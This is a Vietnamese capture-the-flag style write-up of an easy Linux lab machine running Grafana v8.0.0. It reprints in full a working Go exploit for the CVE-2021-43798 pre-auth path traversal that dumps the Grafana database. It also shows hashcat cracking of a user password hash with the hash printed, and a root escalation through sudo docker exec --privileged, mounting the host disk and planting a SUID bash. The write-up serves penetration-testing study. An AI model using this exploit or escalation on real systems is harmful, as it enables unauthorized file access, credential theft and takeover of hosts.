## Tổng quan

Đây là một máy linux dễ, có lỗ hổng Path Traversal vì sử dụng grafana phiên bản v8.0.0 , có thể truy xuất data từ đó lấy được users password.

## Rà quét

![[Pasted image 20241104095714.png]]

Thông tin rà quét từ `nmap` thấy rằng server chỉ mở 2 cổng 22 và 3000.

## Khai thác cổng 3000

![[Pasted image 20241104095826.png]]

Tôi tiến hành tìm kiếm các khai thác phiên bản này và có được thông tin

![[Pasted image 20241104095937.png]]
Đây là lỗ hổng đọc tệp mà không cần xác thực. Mã khai thác được viết bằng go

```
package main
import (
"bufio"
"crypto/tls"
"errors"
"flag"
"fmt"
"io"
"net/http"
"os"
"strings"
)
type Options struct {
list string
target string
file string
output string
dumpDatabase bool
dumpConfig bool
}
var client = &http.Client{
Transport: &http.Transport{
TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
},
}
func log(level, message string) {
fmt.Printf("[%s] %s\n", strings.ToUpper(level), message)
if level == "fatal" {
os.Exit(1)
}
}
func main() {
options := &Options{}
flag.StringVar(&options.list, "list", "", "List of targets")
flag.StringVar(&options.target, "target", "", "Single target to run against")
flag.StringVar(&options.file, "file", "", "Path to file (Ex: /etc/passwd)")
flag.StringVar(&options.output, "output", "", "Output to file (Only for single targets)")
flag.BoolVar(&options.dumpDatabase, "dump-database", false, "Dump sqlite3 database (/var/lib/grafana/grafana.db)")
flag.BoolVar(&options.dumpConfig, "dump-config", false, "Dump defaults.ini config file (conf/defaults.ini)")
flag.Parse()
if options.list != "" && options.target != "" {
log("fatal", "Cannot specify both list and single target")
}
if options.list != "" && options.output != "" {
log("fatal", "Cannot output to file when using list")
}
if options.list == "" && options.target == "" {
log("fatal", "Must specify targets (-target http://localhost:3000)")
}
if options.dumpDatabase || options.dumpConfig {
if options.file != "" {
log("fatal", "Cannot dump database while using file")
}
if options.dumpDatabase && options.dumpConfig {
log("fatal", "Cannot dump database and config at the same time")
}
} else {
if options.file == "" {
log("fatal", "File path must be specified (-file /etc/passwd)")
}
if !strings.HasPrefix(options.file, "/") {
log("fatal", "File path must start with a / (-file /etc/passwd)")
}
}
fmt.Println("CVE-2021-43798 - Grafana 8.x Path Traversal (Pre-Auth)")
fmt.Print("Made by Tay (https://github.com/taythebot)\n\n")
if options.list != "" {
f, err := os.Open(options.list)
if err != nil {
log("fatal", fmt.Sprintf("Failed to open list: %s", err))
}
defer f.Close()
scanner := bufio.NewScanner(f)
for scanner.Scan() {
target := scanner.Text()
log("info", fmt.Sprintf("Exploiting target %s", target))
output, err := exploit(target, options.file, options.dumpDatabase, options.dumpConfig)

if err != nil {
log("error", fmt.Sprintf("Failed to exploit target %s: %s", target, err))
} else {
log("info", fmt.Sprintf("Successfully exploited target %s", target))
fmt.Println(output)
}
}
} else {
log("info", fmt.Sprintf("Exploiting target %s", options.target))
output, err := exploit(options.target, options.file, options.dumpDatabase, options.dumpConfig)
if err != nil {
log("error", fmt.Sprintf("Failed to exploit target %s: %s", options.target, err))
} else {
log("info", fmt.Sprintf("Successfully exploited target %s", options.target))
fmt.Println(output)
if options.output != "" {
f, err := os.Create(options.output)
if err != nil {
log("fatal", fmt.Sprintf("Failed to create output file: %s", err))
}
defer f.Close()
if _, err := f.Write([]byte(output)); err != nil {
log("fatal", fmt.Sprintf("Failed to write to output file: %s", err))
}
log("info", fmt.Sprintf("Succesfully saved output to file %s", options.output))
}
}
}
}
func exploit(target, file string, dumpDatabase, dumpConfig bool) (string, error) {
url := target + "/public/plugins/alertlist/"
if dumpConfig {
url += "../../../../../conf/defaults.ini"
} else if dumpDatabase {
url += "../../../../../../../../var/lib/grafana/grafana.db"
} else {
url += "../../../../../../../../" + file
}
req, err := http.NewRequest("GET", url, nil)
if err != nil {
return "", err
}
req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36")
resp, err := client.Do(req)
if err != nil {
return "", err
}
if resp.StatusCode != 200 {
return "", errors.New("status code is not 200")
}
defer resp.Body.Close()
body, err := io.ReadAll(resp.Body)
if err != nil {
return "", err
}
bodyString := string(body)
if bodyString == "seeker can't seek\n" {
return "", errors.New("cannot read requested file")
}
return bodyString, nil
}
```

Tiến hành khai thác lấy thông tin database

![[Pasted image 20241104100636.png]]

Tôi tiến hành mở tệp database vừa lấy được bằng `sqlite` và có được thông tin users

![[Pasted image 20241104100948.png]]

Có 2 user nhưng password đã được mã hóa. Nhưng có một giá trị **salt** được tạo ra nhằm tăng cường tính bảo mật.

## Giải mã 

Tôi bắt đầu xem mã nguồn của grafana thì thấy kiểu mã hóa mật khẩu

![[Pasted image 20241104102125.png]]

Chương trìnhd đã sử dụng thuật toán băm `PBKDF2` kết hợp với sha256

Tôi dùng hashcat để giải mã. Vì vậy tôi đã xem các mode của hashcat với thuật toán hàm băm PBKDF2 + SHA256

![[Pasted image 20241104103137.png]]

Sau con số 1000 là giá trị safl và giá trị password sau khi đã băm.

Tôi tiến hành giải mã các thông tin đã tìm được trong file database trên trang https://gchq.github.io/

Đầu tiên là giải mã giá trị salt và password của người dùng **boris**

![[Pasted image 20241104103933.png]]

![[Pasted image 20241104113820.png]]

Sau khi ghép lại tôi có giá trị sau:

```
sha256:1000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=
```

Tiến hành dùng `hashcat` để bẻ khóa
```
hashcat -a 0 -m 10900 boris.txt /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20241104144637.png]]

Thử kết nối ssh bằng người dùng **boris** và đọc cờ

```
VL{fbc4248a6ec4f7936b92ec76ad0cb654}
```

![[Pasted image 20241104144747.png]]

## Leo quyền

Khi tôi kiểm tra các file chạy dưới quền sudo mà không cần password thì thấy thông tin này

```
/snap/bin/docker exec
```

![[Pasted image 20241104151811.png]]

Nhưng tôi không biết được rằng nó đang chạy những con **Container** nào? nhưng lại không có quyền show chúng lên.

![[Pasted image 20241104151912.png]]

Tôi tiến hành chạy linpeas để xem có thông tin gì? thì có được id của **Container** đang chạy

![[Pasted image 20241104151732.png]]

```
e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81
```

Kết nối tới container đang chạy

```
sudo /snap/bin/docker exec -it --privileged --user 0  e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 bash
```

![[Pasted image 20241104155915.png]]

Chúng ta đang quyền trong nhóm group trong container. tôi cần khai thác để có được quyền root bên ngoài.

Sau một hồi tìm kiếm tôi thấy ổ lữu trữ container

![[Pasted image 20241104161942.png]]
![[Pasted image 20241104162007.png]]

Tôi so sánh với ổ lưu trữ ở bên ngoài

![[Pasted image 20241104164154.png]]

Tôi chắc rằng, người dùng root đã mount ổ /dev/xcda1 từ bên ngoài vào container. nên khi ta tiến hành chỉnh sửa ở trong container trên ổ này thì bên ngoài cũng sẽ bị thay đổi theo.

Tôi sẽ tiến hành mout ổ này sang một thư mục mới trong người dùng grafana. 

```
mount /dev/xvda1 ./mout
```

![[Pasted image 20241104162206.png]]

Tôi sẽ copy `/bin/bash` sang người dùng boris vì tôi đang chạy dưới quền root.

```
cp ../bin/bash boris/bash
```

![[Pasted image 20241104164442.png]]

Tiếp theo tôi sẽ thực hiện đặt suid cho file này

```
chown root:root bash
chmod 4777 bash
```

![[Pasted image 20241104164849.png]]

Thoát ra bên ngoài và tiến hành lên quyền root

![[Pasted image 20241104164947.png]]

